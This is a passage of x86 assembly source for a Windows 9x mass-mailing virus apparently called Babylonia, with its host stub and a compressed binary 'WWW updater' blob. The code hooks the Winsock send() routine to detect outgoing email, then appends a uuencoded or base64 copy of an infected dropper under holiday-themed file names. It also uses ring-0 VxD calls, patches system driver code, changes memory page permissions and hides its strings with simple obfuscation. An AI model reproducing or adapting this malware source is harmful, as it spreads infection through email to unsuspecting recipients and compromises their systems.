virusmain endp


hlp1_s = $
       dw 4
       dw (ofs _label1-ofs _label2)
_label2 = $
       db "RR(`USER32.DLL',`EnumWindows',`SU')", 0
_label1 = $

       dw 4
_size  dw 0
p1     = $
       db "EnumWindows(`"
hlp1_e = $
hlp1_sz = hlp1_e-hlp1_s
       jmp esp
       db "',666)", 0                          ;29A
hlp2_e = $
hlp2_sz = hlp2_e-hlp1_e


check  proc
       call checkv
       jc @@again_1
       sub edx, edx
       ret
  @@again_1:
       mov ebx, eax
  @@again:
       mov eax, ebx
       call rnd
       xor eax, edx
       call checkv                             ;eax was validated?
       jc @@again
       xchg eax, edx                           ;edx is valid modifier?
       call checkv
       jc @@again
       xchg edx, eax
       ret
check  endp


rnd    proc
       call @@2
       dd 12345678h
  @@2:
       pop edx
       sub [edx], 12345678h
     org $-4
v2     dd 87654321h
       mov edx, [edx]
       xor [ebp+(ofs v2-ofs vcode)], edx       ;get rnd number
       ret
rnd    endp


checkv proc
       pusha
       push 4
       pop ecx
  @@1:
       cmp al, ' '
       jbe @@error
       cmp al, 0f0h
       ja @@error
       cmp al, '"'
       jz @@error
       cmp al, "'"
       jz @@error
       cmp al, "`"
       jz @@error
       cmp al, "\"
       jz @@error
       ror eax, 8                              ;check for invalid characters
       loop @@1                                ;for hlp script
       clc
       mov cl, 12h
     org $-1
  @@error:
       stc
       popa
       ret
checkv endp


open   proc
       call getatt
       mov [ebp+(ofs attr-ofs vcode)], eax
       sub ecx, ecx
       call setatt
       mov [ebp+(ofs fname-ofs vcode)], esi
       mov eax, 0D500h
       push 1h
       sub ecx, ecx
       mov ebx, 2022h
       pop edx
       call io
       mov [ebp+(ofs handle-ofs vcode)], eax
       ret
open   endp


getsize proc
       mov eax, 0D800h
 __2_:
       jmp __2__
getsize endp


close  proc
       mov eax, 0D700h
       call __2_
       mov ecx, 12345678h
  attr equ dwo $-4
       mov esi, 12345678h
  fname equ dwo $-4                             ;set old file attribute
close  endp


setatt proc
       mov eax, 4301h
  __2__:
       jmp __2___
setatt endp


getatt proc
       mov eax, 4300h
  __2___:
       jmp __2
getatt endp


write  proc
       mov eax, 0D601h
       jmp __2___
write  endp


read   proc
       mov eax, 0D600h
  __2:
       mov ebx, 12345678h
  handle equ dwo $-4
read   endp


io     proc
       call delta
       mov [ebp+(ofs eax_value-ofs vcode)], eax
       mov eax, 00400032h                          ;Ring0_IO
       xchg eax, [esp]
       push eax
io     endp


vxd    proc
       pop eax
       call delta
       mov wo [ebp+(ofs @@int-ofs vcode)], 20cdh
       sub eax, ebp
       add eax, -((ofs @@jmp-ofs vcode)+4)
       mov [ebp+(ofs @@jmp-ofs vcode)], eax
       pop dwo [ebp+(ofs @@address-ofs vcode)] ;dynamic VxDCall building
       mov eax, 12345678h
    eax_value equ dwo $-4
  @@int:
       int 20h
  @@address dd 0
       db 0e9h
  @@jmp dd 0
vxd    endp


bound_ db 'OUNDARY="'
bound_sz = $-ofs bound_
       db 0

rva2raw proc
       push esi
       push ecx
       push ebx
       lea esi, [esp+section+(4*4)]            ;first section
       movzx ecx, wo [esp+pe_hdr+6+(4*4)]
  @@section:
       mov ebx, eax
       sub ebx, [esi+12]
       cmp [esi+8], ebx
       jae @@found                             ;point inside section
       sub esi, -40
       loop @@section
       sub ebx, ebx                            ;signal error
       jmp @@error
  @@found:
       add ebx, [esi+20]                       ;convert to raw
  @@error:
       mov eax, ebx
       pop ebx
       pop ecx
       pop esi
       ret
rva2raw endp


check_size proc
       test eax, eax
       jz @@error
       cmp eax, 2*1024*1024
       jae @@error                             ;bigger than 2mb
       cmp eax, 8*1024
       jbe @@error                             ;smaller than 4kb
       sub edx, edx
       push 17
       pop ecx                                 ;if((fsize mod 17) = 15)
       div ecx                                 ;lexo32 ;-)
       sub edx, 15
       db 066h, 0b8h                           ;mov ax, ?
  @@error:
       sub eax, eax
       ret
check_size endp


pstart equ this byte                           ;wsock32.dll code...

       dd 0
       db 'C:\_'
driver db 8 dup (0)                          ;drivername
       db '.---', 0

send   proc
       call init2
       mov eax, 12345678h
     _send equ dwo $-4
       jmp eax                                 ;jmp to hmem send
send   endp


init2  proc
       cld
       pusha
       call @@delta
  @@delta:
       pop ebp
       add ebp, -(ofs @@delta-ofs pstart)      ;get delta in wsock32.dll
       mov ebx, ebp
       lea edi, [ebx+(ofs driver-ofs pstart)]
       push 8
       pop ecx
  @@byte:
       rol ebx, 4
       mov al, bl
       and al, 01111b                          ;convert address to filename
       add al, 'A'
       stosb
       loop @@byte
       add ebx, 4
       push ebx
       db 0b8h
  _getfattr dd 0                               ;call backdoor
       call eax
       mov eax, 90909090h
       lea edi, [ebp+((ofs send-ofs pstart))]
       stosd                                   ;clean calls to install
       stosb
       mov eax, [ebp]                          ;get ring0 interface code
       test eax, eax
       jz @@damaged                            ;cant get the interface
       mov [ebp+(ofs _send-ofs pstart)], eax   ;set jmps to my hmem handlers
  @@damaged:
       popa
       ret
init2  endp

pend   equ this byte


include unpack.inc


ScanVxd proc
       pusha
       mov edi, [ebx+0C0000018h]               ;Control_Proc_0
  @@page:
       lea ecx, [edi+4]                        ;check presence for
       test ecx, 00000FFFh
       jz @@check                              ;to each new page encountered
  @@mov:
       inc edi
       cmp [edi], esi                          ;B8 <esi>
       jne @@page
       cmp by [edi-1], 0B8h
       jne @@page
       mov dwo [edi], -1                       ;R0_xxx <-- 0xFFFFFFFF
       jmp @@page
  @@check:
       pusha
       sub esp, 28
       mov esi, esp
       push 28
       push esi                                ;esi = MEMORY_BASIC_INFO
       push ecx
       push 00010134h
       call vxd                                ;VMMcall PageQuery
       bt dwo [esi+10h], 3                     ;mbi_state & MEM_COMMIT
       lea esp, [esp+4*3+28]
       popa
       jc @@mov                                ;will not fault?
       popa
       ret
ScanVxd endp


     IF DEBUG EQ TRUE
dropname db 'C:\GOAT.EXE', 0
     ELSE
dropname db 'C:\BABYLONIA.EXE', 0
     ENDIF


myname     dd 0
mem_temp   dd 0
mem        dd 0
sent       dd 0
uudropper  dd 0
uusize     dd 0
b64dropper dd 0
b64size    dd 0


my_send  proc
       call init
       pusha
       call delta
       mov esi, [esp+(8*4)+(1*4)+4]          ;send() buffer
       db 0b9h
  socket_out dd 0                           ;we're monitoring a specific socket?
       jecxz @@all
       cmp [esp+(8*4)+(1*4)+0], ecx     ;if so, then make sure is our
       je @@monitor
       jmp @@done

  @@all:
       cmp [esi], 'ATAD'                       ;email is being send!
       jne @@done
       mov eax, [esp+(8*4)+(1*4)+0]            ;monitor this socket only now
       mov [ebp+(ofs socket_out-ofs vcode)], eax
       sub eax, eax
       mov [ebp+(ofs boundary-ofs vcode)], eax ;init MIME fieldz
       mov [ebp+(ofs sent-ofs vcode)], eax
       jmp @@done

  @@monitor:
       mov ecx, [esp+(8*4)+(1*4)+8]            ;size
       mov edi, esi
       mov al, '.'                             ;search .
       push ecx
  @@cont_dot:
       repne scasb                          ;not end_of_email yet
       jne @@no_dot                         ;so, check for MIME
       cmp dwo [edi-2], 0a0d2e0ah
       jne @@cont_dot                     ;make sure is the end_of_email sign
       pop ecx                          ;ecx=size of buffer
       call uu_send
       sub eax, eax                           ;ready to infect next email
       mov [ebp+(ofs socket_out-ofs vcode)], eax
       jmp @@done                              ;send the .

  @@no_dot:
       pop ecx
       dec ecx                                 ;monitor MIME emailz
       dec ecx
       dec ecx                                 ;size-3, since we load DWORDs
       test ecx, ecx
       js @@done                               ;buffer smaller than 2, exit!
  @@scan:
       push ecx
       lodsd
       dec esi
       dec esi
       dec esi
       push esi
       and eax, not 20202020h               ;eax=upcase of 1st 4 letterz
       db 0bah
  boundary dd 0
       test edx, edx                         ;we already found the boundary?
       jnz @@boundary_found
       sub eax, 'NUOB'
       jnz @@bogus                             ;maybe a boundary?
       lea edi, [ebp+(ofs bound_-ofs vcode)]
  @@loop_1:
       cmp by [edi], ah
       je @@done_1
       lodsb
       cmp al, 'a'
       jb @@up
       cmp al, 'z'                             ;check string
       ja @@up
       and al, not 20h
  @@up:
       inc edi
       not al
       cmp by [edi-1], al
       je @@loop_1
  @@done_1:
       jne @@bogus
       mov edi, [ebp+(ofs mem-ofs vcode)]   ;copy MIME boundary to buffer
       mov [ebp+(ofs boundary-ofs vcode)], edi
  @@next_b:
       lodsb
       cmp al, '"'
       je @@copied
       stosb
       jmp @@next_b
  @@copied:
       sub eax, eax                            ;now we have all we need for
       stosd                                   ;a perfect send :)
       jmp @@bogus

  @@boundary_found:
       push esi
       dec esi
       dec ecx
       sub eax, eax                            ;search for boundary
  @@match:
       lodsb
       inc edx
       cmp by [edx], ah
       je @@is_boundary
       cmp by [edx], al                         ;compare stringz
       je @@match
  @@is_boundary:
       xchg edi, esi                           ;edi=end of boundary+1
       pop esi
       jne @@bogus                             ;end reached and all match?
       cmp al, '-'
       jne @@bogus
       scasb                                   ;found last boundary!
       jne @@bogus
       pop eax                                 ;fix stack
       mov [esp], edi
       mov wo [edi-2], 0A0Dh                   ;turn to normal boundary
       sub edi, [esp+(8*4)+(1*4)+4+4]             ;subtract buffer address
       xchg [esp+(8*4)+(1*4)+8+4], edi         ;new size
       mov [ebp+(ofs eax_value2-ofs vcode)], edi     ;save old for return
       push dwo [esp+(8*4)+(1*4)+8+4]  ;size
       push dwo [esp+(8*4)+(1*4)+8+4]  ;buffer
       call safesend
       pop edi                               ;interception point
       mov wo [edi-2], '--'              ;restore user buffer
       mov [ebp+(ofs eax_value2-ofs vcode)], eax
       jc @@error
       call uu_send
       mov eax, [ebp+(ofs eax_value2-ofs vcode)] ;how much they want send
       mov ebx, [esp+(8*4)+(1*4)+8]     ;how much we already send
       sub eax, ebx
       jz @@gran_finale                 ;done
       mov [esp+(8*4)+(1*4)+8], eax     ;send rest
       add [esp+(8*4)+(1*4)+4], ebx     ;starting from last send byte
       push dwo [esp+(8*4)+(1*4)+8]  ;size
       push dwo [esp+(8*4)+(1*4)+8]  ;buffer
       call safesend               ;send the remainder of user buffer
       jc @@error
  @@gran_finale:
       mov edi, [ebp+(ofs boundary-ofs vcode)]
       mov esi, edi
  @@next1:
       lodsb
       test al, al
       jnz @@next1                          ;search end
       xchg edi, esi
       dec edi
       add al, '-'
       stosb                                   ;make last boundary
       stosb
       sub edi, esi                             ;calculate the size
       push edi                         ;size
       push esi
       call safesend            ;send last boundary
  @@error:
       popa
       db 0b8h
   eax_value2 dd 0                              ;return no error
       ret 4*4

  @@bogus:
       pop esi
       pop ecx
       dec ecx
       jnz @@scan                              ;bahh... to far to a loop
  @@done:
       popa
       mov eax, 12345678h
  oldsend equ dwo $-4
       jmp eax
my_send  endp


script db 'Content-Type: application/octet-stream; name="', 1, '"', 13, 10
       db 'Content-Disposition: attachment; filename="', 1, '"', 13, 10
       db 'Content-Transfer-Encoding: base64', 13, 10, 13, 10
       db 0
script_sz = $-ofs script


uu_send proc
       pusha
       sub eax, eax
       cmp [ebp+(ofs sent-ofs vcode)], eax
       jne @@already
       mov edi, [ebp+(ofs boundary-ofs vcode)]
       cmp edi, eax
       je @@skip_header
       add edi, 100h            ;work after boundary
       push edi
       lea esi, [ebp+(ofs script-ofs vcode)]
  @@expand:
       lodsb
       not al
       test al, al
       jz @@send_header
       cmp al, 1
       jnz @@name
       call ninsert                             ;insert exe name
       db 0b0h
  @@name:
       stosb
       jmp @@expand
  @@send_header:
       pop esi
       sub edi, esi
       push edi                 ;size
       push esi                 ;buffer
       call safesend                            ;send mime header
       jc @@fuxkx
       mov edi, [ebp+(ofs b64size-ofs vcode)]
       mov esi, [ebp+(ofs b64dropper-ofs vcode)]
       jmp @@block
  @@skip_header:
       mov edi, [ebp+(ofs uusize-ofs vcode)]
       mov esi, [ebp+(ofs uudropper-ofs vcode)]
  @@block:
       mov eax, 4*1024                  ;block size=4kb
       cmp eax, edi
       jb  @@low
       mov eax, edi                     ;send the remainder
  @@low:
       push eax                         ;size
       push esi                         ;buffer
       call safesend
       jc @@fuxkx
       add esi, eax
       sub edi, eax
       jnz @@block                      ;blockz left?
  @@fuxkx:
       mov [ebp+(ofs sent-ofs vcode)], ebp
  @@already:
       popa
       ret
uu_send endp


init   proc
       pusha
       cld
       sub eax, eax
       call delta
       cmp [ebp+(ofs mem-ofs vcode)], eax
       jne @@inited                     ;we already inited our dropper?
       mov eax, [ebp+(ofs mem_temp-ofs vcode)]
       mov [ebp+(ofs mem-ofs vcode)], eax
       test eax, eax
       jz @@inited
       push eax
       call @@over

include dropper.inc

  @@over:
       call _aP_depack_asm                     ;unpack dropper data

       add esp, -8*2
       push esp
       db 0b8h
  _gsystime dd 0
       call eax
       mov bl, [esp+(1*2)]                      ;bh=month
       add esp, 8*2

       push 6
       lea esi, [ebp+(ofs dates-ofs vcode)]
       lea ecx, [ebp+(ofs name0-ofs vcode)]
       mov [ebp+(ofs myname-ofs vcode)], ecx
       pop ecx
  @@next_date:
       lodsw
       cmp ah, bl
       je @@is
       cmp bl, al
       jne @@nope                        ;this holiday isnt this month
  @@is:
       pusha
       mov edi, [ebp+(ofs mem-ofs vcode)]
       add edi, icon                    ;where icon should go in dropper
       mov esi, edi
       add esi, (ofs coelho-icon)      ;first icon
       mov eax, 1152
       xchg eax, ecx                   ;eax=count ecx=size icon
       dec eax
       lea edx, [ebp+(ofs names-ofs vcode)]
       mov edx, [edx+(eax*4)]
       add edx, ebp
       mov [ebp+(ofs myname-ofs vcode)], edx   ;get dropper name
       cdq
       mul ecx                          ;count*size+base=new icon
       add esi, eax
       rep movsb                                ;install new icon
       popa
  @@nope:
       loop @@next_date                        ;check next date

       push 2
       lea esi, [ebp+(ofs dropname-ofs vcode)]
       pop ecx
       call r3_open
       jz @@fux0r
       push DROPPER_SIZE
       mov esi, [ebp+(ofs mem-ofs vcode)]
       pop ecx
       call r3_write                    ;write clean dropper
       call r3_close
       push 3
       lea esi, [ebp+(ofs dropname-ofs vcode)]
       pop ecx
       call r3_open
       jz @@fux0r1
       call r3_seof                            ;get new dropper size
       cmp eax, DROPPER_SIZE
       je @@fux0r2                              ;was infected?
       push eax
       call r3_ssof
       mov edi, [ebp+(ofs mem-ofs vcode)]
       mov ecx, [esp]
       lea eax, [edi+ecx]
       push edi
       push eax
       call r3_read                            ;read infected dropper
  @@fux0r2:
       call r3_close

  @@fux0r1:
       lea eax, [ebp+(ofs dropname-ofs vcode)]
       push eax
       db 0b8h
  _fdelete dd 0
       call eax
       pop edi                         ;edi=uuencode buffer
       mov esi, [esp]                  ;esi=image
       mov ecx, [esp+4]                ;ecx=size
       call uuencode
       call delta
       mov [ebp+(ofs uudropper-ofs vcode)], edi
       mov [ebp+(ofs uusize-ofs vcode)], ecx
       pop esi                          ;esi=image
       lea edi, [edi+ecx]
       pop eax                             ;eax=size
       call BASE64
       mov [ebp+(ofs b64dropper-ofs vcode)], edi
       mov [ebp+(ofs b64size-ofs vcode)], ecx

       lea eax, [ebp+(ofs wsock-ofs vcode)]
       push eax
       db 0b8h
  _getmhandle dd 0
       call eax
       mov edi, [ebp+(ofs _getproc-ofs vcode)]    ;eax=wsokc32 base

       call @@112
       db 'WSAGetLastError', 0
  @@112:
       push eax
       call edi
       mov [ebp+(ofs _WSAGetLastError-ofs vcode)], eax
       jmp @@inited

  @@fux0r:
       sub eax, eax
       mov [ebp+(ofs mem-ofs vcode)], eax
  @@inited:
       popa
       ret
init   endp


decript_names proc
       pusha
       call delta
       lea edi, [ebp+(ofs name0-ofs vcode)]
       push name_sz
       pop ecx
       mov esi, edi
  @@999:
       lodsb
       not al                           ;crypt/decrypt
       stosb
       loop @@999
       popa
       ret
decript_names endp


ninsert proc
       pusha
       call decript_names
       mov esi, [ebp+(ofs myname-ofs vcode)]
  @@next:
       lodsb
       stosb
       test al, al
       jnz @@next
       dec edi
       mov eax, not 'EXE.'
       not eax
       stosd
       mov [esp], edi
       call decript_names
       popa
       ret
ninsert endp


dates  equ this byte
       db 06, 07                    ; BABILONIA   - US FLAG
       db 12, 12                    ; NAVIDAD     - Papai Noel
       db 04, 04                    ; PASCOA      - Ovo
       db 01, 01                    ; REYES MAGOS - Jesus
       db 10, 11                    ; HALLOWEN    - Abobora
       db 03, 03                    ; PASCOA2     - Coelho


name0  db 'I-WATCH-U', 0            ;default name
name1  db 'BABILONIA', 0
name2  db 'X-MAS', 0
name3  db 'SURPRISE!', 0
name4  db 'JESUS', 0
name5  db 'BUHH', 0
name6  db 'CHOCOLATE', 0
name_sz = $-ofs name0


names  equ this byte
       dd (ofs name6-ofs vcode)
       dd (ofs name5-ofs vcode)
       dd (ofs name4-ofs vcode)
       dd (ofs name3-ofs vcode)
       dd (ofs name2-ofs vcode)
       dd (ofs name1-ofs vcode)
       dd 0


r3_open proc
       sub eax, eax
       push eax
       push 22h
       push ecx
       push eax
       push eax
       push 0c0000000h
       push esi
       mov eax, 12345678h
  _openfile equ dwo $-4
       call eax                                ;CreateFileA
       mov [ebp+(ofs r3handle-ofs vcode)], eax
       inc eax
       ret
r3_open endp


r3_close proc
       push 12345678h
     org $-4
  r3handle dd 0
       mov eax, 12345678h
  _closehandle equ dwo $-4
       call eax                                ;CloseHandle
       ret
r3_close endp


r3_write proc
       push 0
       call @@1
       dd 0
  @@1: push ecx
       push esi
       push dwo [ebp+(ofs r3handle-ofs vcode)]
       mov eax, 12345678h
  _writefile equ dwo $-4
       call eax                                ;WriteFile
       ret
r3_write endp


r3_read proc
       push 0
       call @@1
       dd 0
  @@1: push ecx
       push edi
       push dwo [ebp+(ofs r3handle-ofs vcode)]
       mov eax, 12345678h
  _readfile equ dwo $-4
       call eax                                ;WriteFile
       ret
r3_read endp


r3_ssof proc
       push 0
       db 66h,0b8h
r3_seof proc
       push 2
       push 0
       push 0
       push dwo [ebp+(ofs r3handle-ofs vcode)]
       mov eax, 12345678h
  _seekfile equ dwo $-4
       call eax
       ret
r3_seof endp
r3_ssof endp


;UUENCODE
;ESI=Data to encode
;EDI=Buffer
;ECX=Size of data
uuencode proc
       cld
       push edi
       push esi
       push ecx
       mov eax, 065620A0Dh
       stosw
       stosd
       mov eax, not ' nig'
       not eax
       stosd
       mov eax, not ' 446'
       not eax
       stosd
       call ninsert                            ;insert dropper name
       mov ax, 0A0Dh
       stosw
       mov eax, [esp]                          ;eax=size
       cdq
       push 45
       pop ebx
       div ebx                                 ;dl=rest in last line
       mov ecx, eax                            ;ecx=number of lines
       pop ebp                                 ;esi=start of data
       pop esi
       add ebp, esi                            ;ebp=end of data
  @@line:
       push ecx
       mov al, "M"                             ;start of line
       stosb
       push 15
       pop ecx                                 ;read 15*3 => write 15*4
  @@octet:
       call getbyte
       shr al, 2
       call convert                            ;1st char
       shl al, 4
       and al, 00110000b
       mov bh, al
       call getbyte
       shr al, 4
       and al, 00001111b
       or al, bh
       call convert                            ;2nd char
       shl al, 2
       and al, 11111100b
       mov bh, al
       call getbyte
       shr al, 6
       and al, 00000011b
       or al, bh
       call convert                            ;3th char
       call convert                            ;4th char
       loop @@octet
       mov ax, 0A0Dh
       stosw
       pop ecx
       loop @@line                             ;do next line
       mov eax, edx
       test al, al
       jz @@end
       add al, 20h                             ;do remainder
       stosb
       xor eax, eax
       mov al, dl
       xor edx, edx
       xor ecx, ecx
       push 3
       pop ebx
       div ebx
       mov ecx, eax
       test edx, edx
       jz @@no_rest
       inc cx                                  ;octets to make
  @@no_rest:
       push 1                                  ;is last line
       sub edx, edx                            ;with no rest
       jmp @@octet
  @@end:
       mov eax, 0650A0D60h                     ;"end"
       stosd
       mov eax, 00A0D646Eh
       stosd
       shr eax, 16                      ;cr+lf
       stosw
       pop ecx
       sub edi, ecx
       xchg edi, ecx
       ret
uuencode endp


wsock  db 'WSOCK32.DLL', 0


convert proc
       and al, 00111111b
       jnz @@0
       add al, 40h
  @@0:
       add al, 20h
       stosb
       mov al, ah
       ret
convert endp


getbyte proc
       cmp esi, ebp                            ;end of buffer?
       jne @@load
       xor al, al
       db 0b4h                                 ;skip LODSB
  @@load:
       lodsb
       mov ah, al                              ;backup
       ret
getbyte endp


protect proc
       inc ecx
       add ecx, 4096                           ;tnz again to z0mbie!
       shr ecx, 12
       test ebx, 4095
       jnz @@forget
       shr ebx, 12
       push 0
       push not (00020000h+00040000h)          ;not writeable+user
       push ecx
       push ebx
       push 00010133h        ;PageModifyPermissions
       call vxd
       add  esp, 4*4
  @@forget:
       ret
protect endp


safesend proc
       pusha
  @@retry:
       mov eax, [esp+4+(8*4)]
       mov ecx, [esp+8+(8*4)]
       push 0
       push ecx                 ;size
       push eax                 ;buffer
       push dwo [ebp+(ofs socket_out-ofs vcode)]
       call [ebp+(ofs oldsend-ofs vcode)]
       mov ecx, eax
       inc ecx
       jnz @@done
       db 0b8h
  _WSAGetLastError dd 0
       call eax
       sub eax, 10035                            ;EWOULDBLOCK?
       jz @@retry
       stc                              ;error
       db 0b1h
  @@done:
       clc
       mov [esp+(7*4)], eax
       popa
       ret 2*4
safesend endp


;esi=input
;edi=output
;eax=size
BASE64 proc
       cld
       push edi
       push 3
       call @@trans
trans_table = $
       db 'A','B','C','D','E','F','G','H','I','J'
       db 'K','L','M','N','O','P','Q','R','S','T'
       db 'U','V','W','X','Y','Z','a','b','c','d'
       db 'e','f','g','h','i','j','k','l','m','n'
       db 'o','p','q','r','s','t','u','v','w','x'
       db 'y','z','0','1','2','3','4','5','6','7'
       db '8','9','+','/'
chars dd ?                            ;contador de caracteres
  @@trans:
       pop ebx
       push (ofs chars-ofs trans_table)
       pop ecx
  @@1:
       not by [ebx+ecx-1]                      ;crazy, isnt? ;)
       loop @@1       ;now, imagine what i can do if i wasnt stoned all time
       pop ecx
       cdq
       mov dwo [ebx+ecx+((ofs chars-ofs trans_table)-3)], edx  ;tricky ;)
       div ecx
       mov ecx, eax
       push edx
   @@loop:
       lodsd
       dec esi                              ;edx=original
       mov edx, eax                         ;edx=work copy
       call Temp
       call CODE64Block3
       call CODE64Block4
       loop @@loop
       pop ecx				;get rest
       jecxz @@done
       lodsd
       dec ecx
       jz @@rest1
       movzx edx, ax                            ;use only 2 bytes
       call Temp
       call CODE64Block3
       jmp @@end
   @@rest1:
       movzx edx, al                            ;use 1 byte only
       call Temp
       inc ecx
       inc ecx
   @@end:
       mov al, '='
       rep stosb
   @@done:
       mov eax, 0A0D0A0Dh
       stosd
       push (ofs chars-ofs trans_table)
       pop ecx
  @@2:
       not by [ebx+ecx-1]
       loop @@2
       pop ecx
       sub edi, ecx                            ;edi=buffer
       xchg ecx, edi                           ;ecx=size
       ret
BASE64 endp


Temp   proc
       call CODE64Block1                ;little optimizing routine
       call CODE64Block2
       ret
Temp   endp


CODE64Block1:
       mov eax, edx
       shr eax, 02h
  process3:
       jmp process

CODE64Block2:
       mov eax, edx
       shl al, 04h
       shr ah, 04h
  process2:
       or al, ah                        ;chained jmps
       jmp process3             ;another "why make it easy?" (c) Vecna ;)

CODE64Block3:
       mov eax, edx
       shr eax, 08h
       shl al, 02h
       shr ah, 06h
       jmp process2

CODE64Block4:
       mov eax,edx
       shr eax,10h

  process:
       and al,00111111b
       xlatb
       stosb
       mov eax, dwo [ebx+(ofs chars-ofs trans_table)]
       inc eax
       mov dwo [ebx+(ofs chars-ofs trans_table)], eax
       pusha
       push 0000004Ch
       pop ecx
       cdq
       div ecx
       test edx, edx
       popa
       jnz @@noline
       mov ax, 0A0Dh
       stosw
   @@noline:
       ret

align 4


vend   equ this byte

       db 'EOV', 0

_VIRUS ends

end    main
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[BABYLON.ASM]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[HOST.INC]컴�
_TEXT  segment dword use32 public 'CODE'

main   proc
       call init001
       push 0
       push ofs caption
       push ofs msg
       push 0
  temp1 equ $
       call virusmain
extrn MessageBoxA:PROC
       call MessageBoxA
       push 0
extrn ExitProcess:PROC
       call ExitProcess
main   endp

init001 proc
       mov esi, ofs hlp1_s
       mov edi, esi
       mov ecx, hlp1_sz
  @@1:
       lodsb
       not al
       stosb
       loop @@1

       mov esi, ofs bound_
       mov edi, esi
       mov ecx, bound_sz
  @@2:
       lodsb
       not al
       stosb
       loop @@2

       mov esi, ofs script
       mov edi, esi
       mov ecx, script_sz
  @@3:
       lodsb
       not al
       stosb
       loop @@3

       mov esi, ofs name0
       mov edi, esi
       mov ecx, name_sz
  @@4:
       lodsb
       not al
       stosb
       loop @@4

       mov esi, ofs trans_table
       mov edi, esi
       mov ecx, (ofs chars-ofs trans_table)
  @@5:
       lodsb
       not al
       stosb
       loop @@5

       ret
init001 endp


_TEXT  ends

_DATA  segment dword use32 public 'DATA'

      IF DEBUG EQ TRUE
caption db 'Vecna virus (DEBUG)', 0
      ELSE
caption db 'Vecna virus', 0
      ENDIF

msg     db 'You just released a Win9x virus!', 0

_DATA  ends
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[HOST.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[UPDATER.INC]컴�
;Compressed WWW Updater
;(C) Vecna

db 04Dh, 038h, 05Ah, 090h, 038h, 003h, 066h, 002h
db 004h, 009h, 071h, 0FFh, 081h, 0B8h, 0C2h, 091h
db 001h, 040h, 0C2h, 015h, 0C6h, 080h, 009h, 00Eh
db 0B4h, 04Ch, 0CDh, 021h, 015h, 001h, 0EBh, 018h
db 050h, 045h, 008h, 04Ch, 001h, 053h, 003h, 014h
db 0CEh, 0E0h, 003h, 00Fh, 001h, 00Bh, 096h, 013h
db 065h, 008h, 009h, 006h, 032h, 015h, 010h, 09Ch
db 022h, 052h, 040h, 010h, 020h, 002h, 057h, 001h
db 051h, 08Ah, 040h, 018h, 04Eh, 015h, 007h, 0D9h
db 053h, 020h, 04Dh, 008h, 0EEh, 095h, 04Bh, 095h
db 030h, 011h, 0E5h, 06Bh, 001h, 0A0h, 043h, 04Fh
db 044h, 052h, 045h, 08Dh, 0DDh, 02Bh, 0ECh, 095h
db 002h, 024h, 0A5h, 041h, 0B7h, 040h, 044h, 041h
db 054h, 0CAh, 0B9h, 028h, 020h, 04Ch, 024h, 00Ah
db 0A5h, 0F3h, 060h, 0C0h, 02Eh, 069h, 064h, 039h
db 061h, 074h, 053h, 028h, 024h, 030h, 0D1h, 0E5h
db 00Ch, 02Ah, 028h, 052h, 088h, 0A0h, 0FCh, 068h
db 003h, 040h, 080h, 0E8h, 032h, 0A6h, 005h, 00Bh
db 002h, 020h, 02Bh, 0C0h, 050h, 06Ah, 073h, 001h
db 0E8h, 068h, 031h, 080h, 021h, 05Ch, 0E8h, 0EAh
db 043h, 016h, 035h, 07Ah, 095h, 044h, 065h, 080h
db 00Ch, 0FAh, 0FFh, 074h, 059h, 00Ah, 0FEh, 0EAh
db 048h, 009h, 0C7h, 005h, 04Ch, 021h, 0B0h, 021h
db 068h, 05Bh, 060h, 010h, 012h, 064h, 067h, 0FFh
db 036h, 0E1h, 088h, 00Dh, 089h, 026h, 03Ah, 014h
db 025h, 050h, 03Ah, 032h, 03Ah, 06Bh, 08Bh, 0ACh
db 00Bh, 02Eh, 08Fh, 040h, 006h, 058h, 028h, 083h
db 03Dh, 033h, 0C1h, 082h, 018h, 068h, 060h, 0EAh
db 098h, 0A1h, 04Eh, 0B5h, 0EBh, 0C2h, 070h, 06Ah
db 0A4h, 068h, 06Dh, 0FEh, 05Dh, 018h, 0DDh, 02Dh
db 08Fh, 02Bh, 081h, 0ECh, 08Dh, 001h, 077h, 0D9h
db 068h, 0A9h, 00Fh, 01Eh, 091h, 0DAh, 003h, 085h
db 0C0h, 00Fh, 084h, 0B2h, 028h, 0E1h, 005h, 012h
db 006h, 08Bh, 0F8h, 0BEh, 0C8h, 020h, 00Eh, 031h
db 0B9h, 00Eh, 023h, 0F3h, 0A4h, 094h, 073h, 0DCh
db 022h, 0C8h, 090h, 0AAh, 039h, 00Ah, 055h, 050h
db 0E8h, 0C2h, 014h, 064h, 07Ch, 04Ah, 0BEh, 036h
db 08Eh, 0FDh, 0BAh, 04Ch, 0FFh, 002h, 047h, 003h
db 0ACh, 084h, 0C0h, 074h, 06Fh, 038h, 0BDh, 00Ah
db 08Bh, 0F5h, 07Fh, 061h, 055h, 0E8h, 08Ah, 050h
db 02Ch, 074h, 054h, 02Bh, 01Bh, 0EDh, 068h, 07Ch
db 023h, 0AAh, 078h, 08Fh, 016h, 069h, 03Fh, 08Dh
db 087h, 00Ch, 0BFh, 002h, 037h, 025h, 0D9h, 0D4h
db 002h, 002h, 080h, 0E8h, 0E6h, 0A0h, 028h, 075h
db 025h, 06Ah, 00Ch, 034h, 068h, 0C9h, 02Bh, 082h
db 029h, 055h, 0A2h, 008h, 0FFh, 035h, 08Ah, 031h
db 072h, 0A9h, 00Bh, 091h, 0C3h, 018h, 0BAh, 0FEh
db 0DDh, 0EBh, 005h, 0EFh, 0BCh, 00Dh, 094h, 081h
db 0C4h, 096h, 083h, 0C3h, 080h, 03Dh, 049h, 09Ah
db 038h, 014h, 00Fh, 085h, 00Eh, 014h, 0FEh, 005h
db 00Dh, 050h, 0F0h, 090h, 089h, 054h, 0EFh, 0AEh
db 00Dh, 036h, 0E8h, 062h, 06Fh, 056h, 045h, 090h
db 057h, 0BAh, 034h, 0D8h, 042h, 06Ah, 040h, 068h
db 041h, 0CEh, 010h, 0B4h, 0FEh, 0FAh, 08Ch, 022h
db 01Dh, 0C6h, 043h, 0A3h, 05Ch, 0C4h, 0A6h, 0DAh
db 045h, 0B3h, 0A8h, 0E0h, 00Eh, 0D4h, 03Eh, 0A3h
